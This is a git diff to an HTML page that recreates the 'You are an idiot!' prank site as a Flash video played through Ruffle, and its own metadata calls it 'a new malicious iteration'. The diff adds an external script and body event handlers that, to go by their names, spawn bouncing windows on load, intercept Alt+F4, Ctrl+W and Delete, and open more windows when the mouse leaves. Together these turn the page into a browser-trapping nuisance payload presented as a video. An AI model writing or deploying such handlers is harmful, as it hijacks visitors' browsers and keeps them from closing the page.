@@ -4,7 +4,20 @@
 <meta charset="UTF-8">
 <title>You are an idiot!</title>
 
+<meta name="Author" content="A mystery tbh">
+<meta name="Keywords" content="you are an idiot, you, are, an, idiot, fool">
+<meta name="Description" content="The first and best flash video on the 'net.">
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="You are an idiot!">
+<meta property="og:description" content="This is a new malicious iteration of the legendary website.">
+<meta property="og:image" content="https://raw.githubusercontent.com/CaptainChicky/Trojan.JS.Youareanidiot/main/Mostly%20Local/Idiot!_files/idiot.png">
+
+<!-- Ruffle Flash Emulator -->
 <script src="https://unpkg.com/@ruffle-rs/ruffle"></script>
+
+<!-- Original script -->
+<script src="./Idiot!_files/you.js"></script>
 
 <style>
 html, body {
@@ -13,6 +26,7 @@ html, body {
     height: 100%;
     background: #ffffff;
 }
+
 #flash-container {
     width: 100%;
     height: 100%;
@@ -20,12 +34,16 @@ html, body {
 </style>
 </head>
 
-<body>
+<body 
+onload="flagRun=1;playBall();bookmark();" 
+onkeydown="altf4key();ctrlwkey();delkey();" 
+onmouseout="procreate();">
 
 <div id="flash-container"></div>
 
 <script>
 window.addEventListener("DOMContentLoaded", () => {
+
     const ruffle = window.RufflePlayer.newest();
     const player = ruffle.createPlayer();
 
@@ -34,8 +52,9 @@ window.addEventListener("DOMContentLoaded", () => {
 
     document.getElementById("flash-container").appendChild(player);
 
-    // Auto-load and run the SWF
+    // Load SWF
     player.load("./Idiot!_files/youare.swf");
+
 });
 </script>
 
